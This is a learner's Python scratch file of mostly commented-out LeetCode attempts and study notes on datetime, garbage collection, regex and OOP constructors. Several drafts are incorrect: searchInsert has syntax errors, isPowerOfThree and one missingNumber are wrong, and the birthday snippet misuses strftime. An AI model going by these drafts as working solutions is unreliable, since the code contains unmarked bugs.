#            print(nums[j],'bbbbbbbbbb')
#            distinct.add(nums[j])
#            res+= len(distinct)**2
#            print(len(distinct),'ccccccc')
#            print(res,'dddddddd')
            

# obj=Solution()
# # nums = [1,1]
# nums = [1,2,1]
# a=obj.sumCounts(nums)
# print(a)



# 35. Search Insert Position
# Easy
# Topics
# Companies
# Given a sorted array of distinct integers and a target value, return the index if the target is found. If not, return the index where it would be if it were inserted in order.

# You must write an algorithm with O(log n) runtime complexity.

 

# Example 1:

# Input: nums = [1,3,5,6], target = 5
# Output: 2
# Example 2:

# Input: nums = [1,3,5,6], target = 2
# Output: 1
# Example 3:

# Input: nums = [1,3,5,6], target = 7
# Output: 4

# class Solution:
#     def searchInsert(self, nums, target):
#         for i in range(len(nums)+1):
#             if target==nums[i]
#                 return i
#             elif target!=nums:
#                 nums.append(target)s
#                 nums=sorted(nums)
#                 print(nums)
#                 continue
# obj=Solution()
# nums = [1,3,5,6]
# target = 5
# # nums = [1,3,5,6]
# # target = 2
# # nums = [1,3,5,6]
# # target = 7
# a=obj.searchInsert(nums,target)
# print(a)


# d=bin(1)
# print(d)



# 2917. Find the K-or of an Array

# You are given a 0-indexed integer array nums, and an integer k.

# The K-or of nums is a non-negative integer that satisfies the following:

# The ith bit is set in the K-or if and only if there are at least k elements of nums in which bit i is set.
# Return the K-or of nums.

# Note that a bit i is set in x if (2i AND x) == 2i, where AND is the bitwise AND operator.


# Example 1:

# Input: nums = [7,12,9,8,9,15], k = 4
# Output: 9
# Explanation: Bit 0 is set at nums[0], nums[2], nums[4], and nums[5].
# Bit 1 is set at nums[0], and nums[5].
# Bit 2 is set at nums[0], nums[1], and nums[5].
# Bit 3 is set at nums[1], nums[2], nums[3], nums[4], and nums[5].
# Only bits 0 and 3 are set in at least k elements of the array, and bits i >= 4 are not set in any of the array's elements. Hence, the answer is 2^0 + 2^3 = 9.
# Example 2:

# Input: nums = [2,12,1,11,4,5], k = 6
# Output: 0
# Explanation: Since k == 6 == nums.length, the 6-or of the array is equal to the bitwise AND of all its elements. Hence, the answer is 2 AND 12 AND 1 AND 11 AND 4 AND 5 = 0.
# Example 3:

# Input: nums = [10,8,5,9,11,6,8], k = 1
# Output: 15
# Explanation: Since k == 1, the 1-or of the array is equal to the bitwise OR of all its elements. Hence, the answer is 10 OR 8 OR 5 OR 9 OR 11 OR 6 OR 8 = 15.
 

# Constraints:

# 1 <= nums.length <= 50
# 0 <= nums[i] < 231
# 1 <= k <= nums.length

# Find the maximum number in nums to determine the maximum bit position
        # max_num = max(nums)
        # max_bit_position = len(bin(max_num)) - 2  # Number of bits needed to represent max_num
        
        # # Initialize K-or result
        # k_or_result = 0
        
        # # Iterate through each bit position from 0 to max_bit_position - 1
        # for i in range(max_bit_position):
        #     # Count how many elements in nums have the ith bit set
        #     count = sum((num >> i) & 1 for num in nums)
            
        #     # If the count is greater than or equal to k, set the ith bit in the K-or result
        #     if count >= k:
        #         k_or_result |= (1 << i)
        
        # return k_or_result



# lc 2917
# class Solution:
#     def findKOr(self, nums, k):
#         res = 0
#         for i in range(32):
#             count = 0
#             n = 2**i
#             # print(n)

#             for num in nums:
#                 if num & n:
#                     count += 1
#             if count >= k:
#                 res += n
#         return res

# ob=Solution()
# nums =[7,12,9,8,9,15]
# k =4
# a=ob.findKOr(nums,k)
# # print(a)



# # h= 2**1
# # print(h)



# lc 2923. Find Champion I
# class Solution:
#     def findChampion(self, grid):
#         l=len(grid)
#         print(l,'aa')
#         for i in range(l):
#             print(i,'iiii')
#             is_champ=True
#             for j in range(l):
#                 print(j,'jjjj')
#                 print(grid[j],[i],'hiiiii')
#                 if i!=j and grid[j][i]==1:
                    
#                     is_champ=False
#                     break
#             if is_champ:
#                 return i
#         return -1




# 2928. Distribute Candies Among Children I
# obu=Solution()
# grid = [[0,1],[0,0]]
# # grid = [[0,0,1],[1,0,1],[0,0,0]]
# a=obu.findChampion(grid)
# print(a)

# You are given two positive integers n and limit.

# Return the total number of ways to distribute n candies among 3 children such that no child gets more than limit candies.

# Example 1:

# Input: n = 5, limit = 2
# Output: 3
# Explanation: There are 3 ways to distribute 5 candies such that no child gets more than 2 candies: (1, 2, 2), (2, 1, 2) and (2, 2, 1).
# Example 2:

# Input: n = 3, limit = 3
# Output: 10
# Explanation: There are 10 ways to distribute 3 candies such that no child gets more than 3 candies: (0, 0, 3), (0, 1, 2), (0, 2, 1), (0, 3, 0), (1, 0, 2), (1, 1, 1), (1, 2, 0), (2, 0, 1), (2, 1, 0) and (3, 0, 0).
 

# Constraints:

# 1 <= n <= 50
# 1 <= limit <= 50

# lc 2928
# def distributeCandies(n ,limit) :
#         res=0
#         for i in range(limit+1):
#         #     print(i,'iii')
#             for j in range(limit+1):
#                 # print(j,'jjjjj')
#                 k= n-i-j
#                 print(k,'kkkkkkkk')
#                 if k>=0 and k<=limit:
#                     res+=1
#         return res   

# # Test cases

# print(distributeCandies(5, 2)) # Output: 3
# # print(distributeCandies(3, 3)) # Output: 10



# lc 2932
# class Solution:
#     def maximumStrongPairXor(self, nums):
#         ans = 0
#         for x in nums:
#             # print(x)
#             for y in nums:
#                 # print(y)
#                 if abs(x-y) <= min(x,y):
#                     print(abs(x-y),'aaaa')
#                     print(min(x,y),'bbb')
#                     ans = max(ans, x^y)
#         # return ans
    

# ob=Solution()
# nums = [1,2,3,4,5]
# a=ob.maximumStrongPairXor(nums)
# print(a)



# d=abs(1-5)
# print(d)

# # lc 2937
#  def findMinimumOperations(self, s1: str, s2: str, s3: str) -> int:
#         if not s1[0] == s2[0] == s3[0]:
#           return -1

#         l1, l2, l3, i = len(s1), len(s2), len(s3), 1
#         while i < min(l1, l2, l3):
#             if s1[i] == s2[i] == s3[i]:
#                 i += 1
#             else:
#                 break

#         return l1 + l2 + l3 - 3 * i



# lc 2942
# class Solution:
#  def findWordsContaining(self, words, x):
#         arr=[]
#         for i in range(len(words)):
#             if x in words[i]:
#                 arr.append(i)
#         return arr

# ob=Solution()
# words = ["leet","code"]
# x = "e"
# a=ob.findWordsContaining(words,x)
# print(a)





# lc 2951. Find the Peaks
# class Solution:
#     def findPeaks(self, mountain) :
#         arr=[]
#         for i in range(1, len(mountain) - 1):
#                 if mountain[i] > mountain[i-1] and mountain[i] > mountain[i+1]:
#                         arr.append(i)
#         return arr
    

# of=Solution()
# mountain = [1,4,3,8,5]
# a=of.findPeaks(mountain)
# print(a)


# lc 2956
# class Solution:
#     def findIntersectionValues(self, nums1, nums2) :
#         arr=[]
#         c1=0
#         c2=0
#         nums3=set(nums1)
#         nums4=set(nums2)
        
#         for i in nums1:
#         #     print(i)
#             if i in nums4:
#                 # print(i)
#                 c1+=1
#                 # print(c1)
#         for j in nums2:
#             if j in nums3:
#                 c2+=1
#         return[c1,c2]

# afd=Solution()
# nums1 = [4,3,2,3,1]
# nums2 = [2,2,5,2,3,6]  
# a=afd.findIntersectionValues(nums1,nums2)
# print(a)


# lc 2960
# class Solution:
#     def countTestedDevices(self, batteryPercentages):
#         c=0
#         for i in range(len(batteryPercentages)):
#             if batteryPercentages[i]>0:
#                 c+=1
#                 for j in range(i+1,len(batteryPercentages)):
#                     batteryPercentages[j]=max(0,batteryPercentages[j]-1)
#                     print(batteryPercentages[j])
#         return c



# of=Solution()
# batteryPercentages = [1,1,2,1,3]
# a=of.countTestedDevices(batteryPercentages)
# print(a)


# class shamnad:
#     def apple(self):
#         print('hoo')
#     def orange(self):
#         print('hiiii')
# aj=shamnad()
# a=aj.apple()
# a=aj.orange()

# lc2974
# class solution():
#       def numberGame(self,nums):

#                 nums.sort()
#                 i=0
#                 while(i<len(nums)):
#                         nums[i],nums[i+1]=nums[i+1],nums[i]
#                         print(nums[i],nums[i+1],nums[i+1],nums[i])
#                         i+=2
#                 return nums  
# obj=solution()
# nums=[5,4,2,3]
# a=obj.numberGame(nums)


# lc2965
# class Solution:
#     def findMissingAndRepeatedValues(self, grid):
#         n=len(grid)
#         print(n,'length')
#         totalsum=n*(n+1)//2 
#         print(totalsum,'total sum')
#         count =[0]*(n*n+1)
#         print(count,'count')

#         repeatednum=missingnum=None
#         print(repeatednum,missingnum,'aaaaaaaaa')

#         for row in grid:
#             print(row)
#             for num in row:
#                 print(num)
#                 totalsum-=num
#                 print(totalsum,'totalsum')
#                 count[num]+=1
#                 print(count[num])
        
#         for i in range(1,n*n+1):
#             if count[i]==2:
#                 repeatednum=i
#             elif count[i]==0:
#                 missingnum=i
#         return [repeatednum,missingnum]
    
# ob=Solution()
# grid = [[1,3],[2,2]]
# # grid = [[9,1,7],[8,9,2],[3,4,6]]
# a=ob.findMissingAndRepeatedValues(grid)
# print(a)

# lc 2980
# class Solution:
#     def hasTrailingZeros(self, nums):
#         c=0
#         for i in nums:
#             if i%2==0:
#                 c+=1
#         if c>=2:
#             return True
            
# obj=Solution()
# nums = [1,2,3,4,5]
# a=obj.hasTrailingZeros(nums)
# print(a)


# lc 2970
# nums = [1,2,3,4]
# class solution():
#     def incremovableSubarrayCount(self, nums):
#             c=0
#             for i in range(len(nums)):
#                 for j in range(i+1,len(nums)+1):
#                     l=nums[:i]+nums[j:]
#                     if l==sorted(l) and len(l)==len(set(l)):
#                         c+=1
#             return c

# obj=solution()
# nums = [1,2,3,4]
# a=obj.incremovableSubarrayCount(nums)
# print(a)


# a=[1,2,12,88]
# op=[2, 12, 88]

# l=a[1:]
# print(l)

# # lc 3010
# nums=[1,2,12]

# def minimumCost( nums):
#         sum=nums[0]
#         nums=nums[1:]
#         nums.sort()
#         return sum+nums[0]+nums[1]

#         # print(nums)

# res=minimumCost(nums)
# # print(res)


# 3019. Number of Changing Keys
# class Solution:
#     def countKeyChanges(self, s):
#         c=0
#         for i in range(1,len(s)):
#             if s[i].lower()!=s[i-1].lower():
#                 c+=1
#         return c
    
# ob=Solution()
# s= "aAbBcC"
# a=ob.countKeyChanges(s)
# print(a)


# nums = [3,4,5]
# # for i in range(len(nums)):
# for i in nums:
#         # if i==i+1 and i==i+2:
#                 print(i+1)


# lc 3024. Type of Triangle
# class Solution:
#     def triangleType(self, nums):
#         z='equilateral'
#         y='isosceles'
#         x='scalene'
#         nums.sort()
#         a,b,c=nums[0],nums[1],nums[2]
#         if a+b>c:
#             if a==b==c:
#                 return z
#             elif a!=b and b!=c and a!=c:
#                 return x
#             else:
#                 return y 
#         return 'none'
    
# ob=Solution()
# nums = [3,4,5]
# a=ob.triangleType(nums)
# print(a)

# lc 3046
# class Solution:
#     def isPossibleToSplit(self, nums):
#         nums.sort()
#         num1=[]
#         num2=[]
#         for i in range(len(nums)):
#             if i%2==0:
#                 num2.append(nums[i])
#             else:
#                 num1.append(nums[i])
#         return len(num1)==len(set(num1)) and len(num2)==len(set(num2))
#         # arr1=[]
#         # arr2=[]
#         # k=len(nums)//2
#         # for i in range(k):
#         #     arr1.append(nums[i])
#         # for j in range(k,len(nums)):
#         #     arr2.append(nums[j])
#         # for k in arr1:
#         #     # for k in arr2:
#         #     #     if e==k:
#         #             return False

#         # return True
#         #         # else:
# ob=Solution()
# # nums =[10,1,7,4,5,1,6,4]
# nums =[6,1,3,1,1,8,9,2]

# a=ob.isPossibleToSplit(nums)
# print(a)

# 3038. Maximum Number of Operations With the Same Score I
# class Solution:
#     def maxOperations(self,nums):
#         s= nums[0]+nums[1]
#         c=1
#         i=2
#         while i<=len(nums)-2:
#             if nums[i]+nums[i+1]==s:
#                 c+=1
#                 i+=2
#             else:
#                 break
#         return c
# obj=Solution()
# nums =[3,2,4,1,5]
# a=obj.maxOperations(nums)
# print(a)

# 3042. Count Prefix and Suffix Pairs I
# words = ["a","aba","ababa","aa"]
# class Solution:
#     def countPrefixSuffixPairs(self,words):
#         count = 0
#         for i in range(len(words)):
#             for j in range(i + 1, len(words)):
#                 if words[j].startswith(words[i]) and words[j].endswith(words[i]):
#                     count += 1
#         return count


#     # def countPrefixSuffixPairs(self,words):
#         # c=0
#         # for i in range(len(words)):
#         #     k=len(words[i])
#         #     for j in range(i+1,len(words)):
#         #         s=words[j]
#         #         sl=s[:k]
#         #         if len(sl)==1:
#         #             print(sl,'sllllllllllll')
#         #             if sl==words[i]:
#         #                 c+=1
#         #         elif len(sl)>1:
#         #             sl=s[:k-1]
#         #             if sl==words[i]:
#         #                 c+=1

#         # return c
    
# ob=Solution()
# words = ["a","aba","ababa","aa"]
# a=ob.countPrefixSuffixPairs(words)
# print(a)
            
# # w='abcdedfghijklmnopqrstuvwxyz'
# # k=4
# # s1=w[:k-1]
# # print(s1)



# 26. Remove Duplicates from Sorted Array
# class Solution:
#     def removeDuplicates(self, nums) :
#           s = set(nums)
#           nums.clear()
#           for i in s:
#                nums.append(i)
#           nums.sort()
#           return len(nums)

# obj=Solution()
# nums = [0,0,1,1,1,2,2,3,3,4]
# a=obj.removeDuplicates(nums)
# print(a)



# nums = [0,0,1,1,1,2,2,3,3,4,]
# zx=nums.clear()
# print(zx)


#lc 125
# class Solution:
#     def isPalindrome(self, s) :
#         k=''
#         for i in s:
#             if i.isalnum()==True:
#                 k+=i.lower()
#                 print(k,'aaaaaaaa')
#         return k == k[::-1]
    
# obj=Solution()
# s = "A man, a plan, a canal: Panama"
# a=obj.isPalindrome(s)
# print(a)

# a=[1,2]
# b=a
# b.append(3)
# # print(a)
# n=6
# while n >0:
#     print(n)
#     n-=2 if n%3==0 else 1




# lc 217
# class Solution:
#     def containsDuplicate(self,nums):
#         # for i in range(len(nums)):
#         #     for j in range(i+1,len(nums)):
#         #         if nums[i] == nums[j]:
#         #             return True
#         # return False

#         num_set = set()
#         for num in nums:
#                 if num in num_set:
#                         return True
#                 num_set.add(num)
#         return False
        
# obj=Solution()
# nums=[1,2,3,1]
# a=obj.containsDuplicate(nums)
# print(a)



# a=[1,2,3,5]
# for a[-1] in a:
# #     print(a)
#     print(a[-1])

# a=[a,b,c,d]
# for i in a:
#     a.append(i.upper())
# print(a)
# n=16
# while n>1:
#     if n%4!=0:
#         print('hle') 
#     n/=4
#     print(n)
#     print ('hi')


# class Solution:
#     def isPowerOfThree(self ,n ):
#         if n<1:
#             return False
        
#         while n>1:
#             if n % 3 != 0:
#                 return False
#             n /=3
#             print(n)
#             return True
# obj=Solution()
# n=27
# a=obj.isPowerOfThree(n)
# print(a)


# class Solution:
#     def missingNumber(self, nums):
#         # le=len(nums)
#         nums=sorted(nums)
#         l=nums[-1]
#         f=nums[1]
#         # print(f,l,le,'hiiiii')

#         if len(nums)==2:
#             r=f+1
#             return r
#         elif len(nums)>2:
#             r=l-f
#             return r
        


# obj=Solution()
# nums = [0,1]
# a=obj.missingNumber(nums)
# print(a)



# class Solution:
#     def missingNumber(self, nums: List[int]) -> int:
#         left,right=0,len(nums)
#         nums.sort()
#         while left<=right:
#             mid=(left+right)//2
#             if mid>len(nums)-1:
#                 return mid
#             elif mid!=nums[mid] and mid<len(nums):
#                 right=mid-1
#             elif mid==nums[mid]:
#                 left=mid+1
#         return left      

# [3,0,1]          


# lc 334

# class Solution:
#     def reverstring(self,s):
#         s.reverse()
#         return s

# obj=Solution()
# s = ["h","e","l","l","o"]
# a=obj.reverstring(s)
# print(a)
    
        
# lc 350

# Given two integer arrays nums1 and nums2, return an array of their intersection. Each element in the result must appear as many times as it shows in both arrays and you may return the result in any order.
# Example 1:

# Input: nums1 = [1,2,2,1], nums2 = [2,2]
# Output: [2,2]
# Example 2:

# Input: nums1 = [4,9,5], nums2 = [9,4,9,8,4]
# Output: [4,9]
# Explanation: [9,4] is also accepted.

# class Solution:
#     def intersect(self, nums1, nums2) :
#         count={}
#         for i in nums1:
#             if i in count:
#                 count[i]+=1
#             else:
#                 count[i]=1
        
#         res=[]
#         for i in nums2:
#             if i in count and count[i]>0:
#                 res.append(i)
#                 count[i]-=1
#         return res
# obj=Solution()
# nums1 = [1,2,2,1]
# nums2 = [2,2]
# a=obj.intersect(nums1,nums2)
# print(a)

# s=0
# c=0
# num=[1,2,3,4,5,6,7,8,9,10]
# for i in num:
#     if i%2==0:
#         c+=1
#         t=c*2
#         s+=i
# print(s)
# print(t)

# class Solution():
#     def target(self, nums, t):
#         d={}

#         for i in range(len(nums)):
#             k=t-nums[i]

#             if k in d:
#                 return [d[k],i]
#             d[nums[i]]=i
#         return d

# obj = Solution()
# nums = [2, 7, 11, 15]
# t = 9
# a = obj.target(nums, t)
# print(a)


#lc 414

# class Solution:
#     def thirdMax(self, nums):
#         k=list(set(nums))
#         k.sort()
#         if len(k)>=3:
#             return k[len(k)-3]
#         return max(k)
     
# obj=Solution()
# nums=[3,2,1]
# a=obj.thirdMax(nums)
# print(a)


# #chat gpt
# class Solution:
#     def thirdMax(self, nums):
#         nums_set = list(set(nums))  # Remove duplicates
#         nums_set.sort(reverse=True)  # Sort in descending order
        
#         if len(nums_set) >= 3:
#             return nums_set[2]  # Return the third maximum number
#         else:
#             return max(nums_set)  # Return the maximum number if there are fewer than three unique numbers

# obj = Solution()
# nums = [3, 2, 1]
# a = obj.thirdMax(nums)
# print(a)


# class Car:
#   def __init__(self, color, model):
#     self.color = color  # Property
#     self.model = model  # Property

#   def accelerate(self):  # Method
#     print(f"The {self.color} {self.model} accelerates!")

# # Create a Car object
# my_car = Car("red", "Tesla Model S")

# # Access property (get value)
# print(f"Car color: {my_car.color}")

# # Call method
# my_car.accelerate()

# lc 905
# class Solution:
#   def sortArrayByParity(self, nums):
      # lis=[]
      # for i in nums:
      #     if i%2==0:
      #         lis.append(i)
          
      # for i in nums:
      #     if i %2 !=0:
      #         lis.append(i)
      # return lis

# obj=Solution()
# nums=[3,1,2,4]
# a= obj.sortArrayByParity(nums)
# print(a)
# another method

# class Solution:
#   def sortArrayByParity(self, nums):
#     lis1=[]
#     lis2=[]
#     for i in nums:
#       if i % 2 == 0:
#         lis1.append(i)
#       else:
#         lis2.append(i)
#     return lis1+lis2
  
# obj=Solution()
# nums=[3,1,2,4]
# a= obj.sortArrayByParity(nums)
# print(a)
        


# lc 1207. Unique Number of Occurrences
# gpt work flow : https://chatgpt.com/share/259f8847-1fd6-4f4a-bb9a-3cf881aaf63c

# class Solution:
#     def uniqueOccurrences(self, arr) :
#         # c=0
#         # for i in range(len(arr)):
#         #     for j in range(i+1,len(arr)):
#         #         print(c,c+1,'hiiiiiiiiii')
#         #         if arr[i] == arr[j]:
#         #             c+=1
#         #         if c == arr[c]:
#         #             print('iiiiiiii')
#         #             return True
#         #         else:
#         #           return False

#           occurrences = {}
#           for num in arr:
#               if num in occurrences:
#                   occurrences[num] += 1
#                   print(occurrences[num],'yyy')
#               else:
#                   occurrences[num] = 1
          
#           # List to store the counts of occurrences
#           counts = list(occurrences.values())
          
#           # Check if all counts are unique by comparing length with set length
#           return len(counts) == len(set(counts))



# obj=Solution()
# arr =[1,2,2,1,1,3]
# a=obj.uniqueOccurrences(arr)
# print(a)


# # a function inside another function (sachuuuuuu)
# def create_larger_than_predicate(threshold):
#     def predicate(number):
#         return number > threshold
#     return predicate

# def main():
#     larger_than_two = create_larger_than_predicate(2)
#     larger_than_five = create_larger_than_predicate(5)

#     print(larger_than_two(3))  # True
#     print(larger_than_five(3))  # False

# if __name__ == "__main__":
#     main()

# Returning functions from functions: 
# A fundamental concept in any programming language is the ability to return a value from a function.
#  Since a function is treated just like a regular object, it can also be returned from another function.
#///////////////////////////-----------------------------------------------------////////////////////////////////////////---------------------------



# __all__ = ("date", "datetime", "time", "timedelta", "timezone", "tzinfo",
#            "MINYEAR", "MAXYEAR", "UTC")
# import time as _time

# # Correctly substitute for %z and %Z escapes in strftime formats.
# def _wrap_strftime(object, format, timetuple):
#     # Don't call utcoffset() or tzname() unless actually needed.
#     freplace = None  # the string to use for %f
#     zreplace = None  # the string to use for %z
#     Zreplace = None  # the string to use for %Z

#     # Scan format for %z and %Z escapes, replacing as needed.
#     newformat = []
#     push = newformat.append
#     i, n = 0, len(format)
#     while i < n:
#         ch = format[i]
#         i += 1
#         if ch == '%':
#             if i < n:
#                 ch = format[i]
#                 i += 1
#                 if ch == 'f':
#                     if freplace is None:
#                         freplace = '%06d' % getattr(object,'microsecond', 0)
#                     newformat.append(freplace)
#                 elif ch == 'z':
#                     if zreplace is None:
#                         zreplace = ""
#                         if hasattr(object, "utcoffset"):
#                             offset = object.utcoffset()
#                             if offset is not None:
#                                 sign = '+'
#                                 if offset.days < 0:
#                                     offset = -offset
#                                     sign = '-'
#                                 h, rest = divmod(offset, timedelta(hours=1))
#                                 m, rest = divmod(rest, timedelta(minutes=1))
#                                 s = rest.seconds
#                                 u = offset.microseconds
#                                 if u:
#                                     zreplace = '%c%02d%02d%02d.%06d' % (sign, h, m, s, u)
#                                 elif s:
#                                     zreplace = '%c%02d%02d%02d' % (sign, h, m, s)
#                                 else:
#                                     zreplace = '%c%02d%02d' % (sign, h, m)
#                     assert '%' not in zreplace
#                     newformat.append(zreplace)
#                 elif ch == 'Z':
#                     if Zreplace is None:
#                         Zreplace = ""
#                         if hasattr(object, "tzname"):
#                             s = object.tzname()
#                             if s is not None:
#                                 # strftime is going to have at this: escape %
#                                 Zreplace = s.replace('%', '%%')
#                     newformat.append(Zreplace)
#                 else:
#                     push('%')
#                     push(ch)
#             else:
#                 push('%')
#         else:
#             push(ch)
#     newformat = "".join(newformat)
#     return _time.strftime(newformat, timetuple)
# from datetime import datetime
# import datetime

# def strftime(self, fmt):
#     """
#     Format using strftime().

#     Example: "%d/%m/%Y, %H:%M:%S"
#     """
#     return _wrap_strftime(self, fmt, self.timetuple())
# # Assuming customer_birthday is a datetime.date or datetime.datetime object
# customer_birthday = "2024/12/25"
# print(customer_birthday,'111111111')
# customer_birthday_str = customer_birthday.strftime("%m-%d")  # Converts to "MM-DD" format

# # Get the current year
# current_year = datetime.now().year

# # Combine customer_birthday_str with the current year to form "MM-DD-YYYY"
# customer_birthday_current_year_str = f"{customer_birthday_str}-{current_year}"

# # Convert the string back to a date object if needed
# customer_birthday_current_year = datetime.strptime(customer_birthday_current_year_str, "%m-%d-%Y").date()

# print(customer_birthday_current_year_str)  # Output: "01-25-2024"
# print(customer_birthday_current_year)  # Output: 2024-01-25



# import pytz

# # Get a list of all time zone names
# timezones = pytz.all_timezones

# # Print each time zone
# for tz in timezones:
#     print(f"'{tz}'")



# from datetime import datetime, timedelta

# expiry_days = 10
# future_date = datetime.now() + timedelta(days=expiry_days)

# print(future_date)



# import requests

# def convert_currency(amount, from_currency, to_currency):
#   """Converts a given amount from one currency to another using the OpenExchangeRates API.

#   Args:
#     amount: The amount to convert.
#     from_currency: The three-letter ISO 4217 code of the source currency.
#     to_currency: The three-letter ISO 4217 code of the target currency.

#   Returns:
#     The converted amount.
#   """

#   # Replace 'YOUR_API_KEY' with your actual API key from OpenExchangeRates
#   api_key = 'YOUR_API_KEY'

#   url = f'https://openexchangerates.org/api/latest.json?app_id={api_key}'
#   response = requests.get(url)

#   if response.status_code == 200:
#     data = response.json()
#     exchange_rate = data['rates'][to_currency] / data['rates'][from_currency]
#     converted_amount = amount * exchange_rate
#     return converted_amount
#   else:
#     raise Exception('Failed to fetch exchange rates.')

# # Example usage
# amount = 100
# from_currency = 'USD'
# to_currency = 'EUR'

# converted_amount = convert_currency(amount, from_currency, to_currency)
# print(f"{amount} {from_currency} is equal to {converted_amount:.2f} {to_currency}")



# import sys
# import os

# try:
#     # Code that may raise an exception
#     result = 1 / 0  # This will raise ZeroDivisionError
# except:
#     exc_type, exc_obj, exc_tb = sys.exc_info()
#     fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
#     print(f"Exception occurred in file: {fname}")

# import antigravity

# collector = gc.collect()
# print(collector,'aaaaaaaaaaaaaaa')

'''---------------------Grabage colector-------------------'''
# import gc
# i = 0

# # create a cycle and on each iteration x as a dictionary
# # assigned to 

# # import pdb ; pdb.set_trace()

# def create_cycle():
# 	x = { }
# 	x[i+1] = x
# 	print(x)

# # lists are cleared whenever a full collection or 
# # collection of the highest generation (2) is run
# collected = gc.collect() # or gc.collect(2)
# print("Garbage collector2: collected %d objects." % (collected))

# print("Creating cycles...")
# for i in range(10):
#         # print('hiiiii')
# 	create_cycle()

# collected = gc.collect()

# print("Garbage1 collector: collected %d objects." % (collected))



# '''------------------regex---------------------------------------'''
# import re 
# a = 'The rain in the Spain'
# c = re.search("^the.*spain$",a,re.IGNORECASE)

# if c:
#         print(f"aaaaaaaaa,{c}")
# else:
#         print('no match')

''' sonarQube (use docstsring) '''

# # Create an object
# a = "Hello"
# b = 'Hello'

# # Get the ID (memory address) of the objects
# print(id(a))  # Prints the unique ID of the string object 'a'
# print(id(b))  

'''time zone and timedelta'''
# from datetime import timedelta
# from django.utils import timezone

# a = timezone.now()
# print(a)
# b = timedelta(minutes=5)
# print(b)



# നന്മ=1
# print(നന്മ)

# '''is digit function'''

# txt = 50800
# a=type(txt)
# # x = txt.isdigit()
# print(a)
# string1 = "12345"
# string2 = "abc123"
# string3 = "123.45"

# print(string1.isdigit())  # Output: True
# print(string2.isdigit())  # Output: False
# print(string3.isdigit())  # Output: False

'''oops'''
'''constructors'''
''' constructors are special methods that are used to initialize an object when it is created. The constructor in Python is defined using the __init__ method.'''
# class ClassName:
#         def Cat(self,parameter):
#                 self.attribute = parameter
#                 return self.attribute


# obj = ClassName()
# a = obj.Cat(5)
# print(a)



# class Person:
#     def __init__(self, name, age):
#         self.name = name  # Initialize the name attribute
#         self.age = age    # Initialize the age attribute

# # Create an instance of the Person class
# person1 = Person("Alice", 30)

# # Access attributes
# print(person1.name)  # Output: Alice
# print(person1.age)   # Output: 30


# class Person:
#     def __init__(self, name="Unknown", age=0):
#         self.name = name
#         self.age = age

# person2 = Person()  # Uses default values
# print(person2.name)  # Output: Unknown


# class ClassName:
#     def Cat(self, parameter):
#         self.attribute = 5
#         return self.attribute

# # Create an instance of the class
# obj = ClassName()

# # Call the Cat method
# result = obj.Cat(10)
# print(result)  # Output: 5



# '''Types of consturctors'''


# '''1.default constructor'''
# class DefaultConstructor:
#     def __init__(self):
#         self.attribute = "Default Value"

# obj = DefaultConstructor()
# print(obj.attribute)  # Output: Default Value


# class Name:
#         def __init__(self,name,attr):
#                 self.name = 'aaaaaaa'
#                 self.attr='default'

# obj= Name('shamnad','bbbbbbbb')
# a = obj.attr
# b = obj.name
# print(a,b)

# '''2.Parameterized Constructor'''

# class ParameterizedConstructor:
#     def __init__(self, name, age):
#         self.name = name
#         self.age = age

# obj = ParameterizedConstructor("Alice", 30)
# print(obj.name)  # Output: Alice
# print(obj.age)   # Output: 30


# '''3. Default Arguments Constructor'''

# class DefaultArgsConstructor:
#     def __init__(self, name="Default Name", age=0):
#         self.name = name
#         self.age = age

# obj1 = DefaultArgsConstructor()  # Uses default values
# # obj2 = DefaultArgsConstructor("Bob", 25)

# print(obj1.name, obj1.age)  # Output: Default Name 0
# # print(obj2.name, obj2.age)  # Output: Bob 25

# '''4. Private Constructor'''

# class PrivateConstructor:
#     def __init__(self):
#         print("Private constructor is being called!")

#     @classmethod
#     def create_instance(cls):
#         return cls()

# # obj = PrivateConstructor()  # Direct instantiation discouraged
# obj = PrivateConstructor.create_instance()  # Use the factory method


# '''5. Copy Constructor'''
# class CopyConstructor:
#     def __init__(self, obj=None):
#         if obj:
#             self.name = obj.name
#             self.age = obj.age
#         else:
#             self.name = "Default"
#             self.age = 0

# obj1 = CopyConstructor()
# obj2 = CopyConstructor(obj1)

# print(obj2.name, obj2.age)  # Output: Default 0



# my opps

# class PrivateConstructor:
#     def __init__(self):
#         # Prevent accidental instantiation
#         raise RuntimeError("Direct instantiation not allowed. Use create_instance() instead.")

#     @classmethod
#     def create_instance(cls):
#         # Create and return an instance of the class
#         obj = cls.__new__(cls)  # Bypass __init__
#         obj.name = "Instance created using factory method!"
#         return obj

# obj = PrivateConstructor()  # Raises an error
# # obj = PrivateConstructor.create_instance()
# print(obj.name)  # Output: Instance created using factory method!



# class CopyConstructor:
#     def __init__(self, obj=None):
#         if obj:
#             self.name = obj.name
#             self.age = obj.age
#         else:
#             self.name = "Default"
#             self.age = 0

# obj1 = CopyConstructor()
# obj2 = CopyConstructor(obj1)

# print(obj2.name, obj2.age)  # Output: Default 0



'''copy constructor detailed '''
# class Copy:
#     def __init__(self,obj=None):
#         if obj:
#             self.name = obj.name
#             self.age = obj.age
#         else:
#             self.name = 'Default'
#             self.age = 0
# obj3 = Copy()
# obj1 = Copy(obj3)
# print(obj1.name,obj1.age)

'''too add valuesss'''
# class Copy:
#     def __init__(self,obj=None):
#         if obj:
#             self.name = obj.name
#             self.age = obj.age
#         else:
#             self.name = 'Default'
#             self.age = 0
# obj3 = Copy()
# obj3.name = 'shamnad'
# obj3.age = 25
# # obj1 = Copy(obj3)
# print(obj3.name,obj3.age)



'''private constructore'''

# _a - protected variable
# __a - private variable

# class Singleton:
#     # Class-level variable to store the instance
#     # _instance = None  # private variable
#     _instance = '5' # private variable


#     def __init__(self):
#         if Singleton._instance is not None:
#             raise Exception("This class is a singleton!")
#         print("Private constructor called!")

#     @classmethod
#     def get_instance(cls):
#         if cls._instance is None:
#             cls._instance = Singleton()
#         # return cls._instance
#         return print(cls._instance)


#     def show_message(self):
#         print("Singleton instance in action!")


# Testing the Singleton
# try:
#     obj1 = Singleton()  # This will raise an exception
# except Exception as e:
#     print(e)

# Correct way to get the instance
# singleton = Singleton.get_instance()

'''Since _instance is not None, when Singleton.get_instance() is called, it does not create a new Singleton object. Instead, it simply returns the current value of _instance, which is 5.
show_message Call:

After getting the "instance" from get_instance, you call singleton.show_message().
However, singleton is now holding the integer 5, not an actual Singleton object.
Since integers (int) do not have a show_message method, Python raises an AttributeError:'''

# singleton.show_message()



# # Verify only one instance is created
# another_singleton = Singleton.get_instance()
# print("Are both instances the same?", singleton is another_singleton)

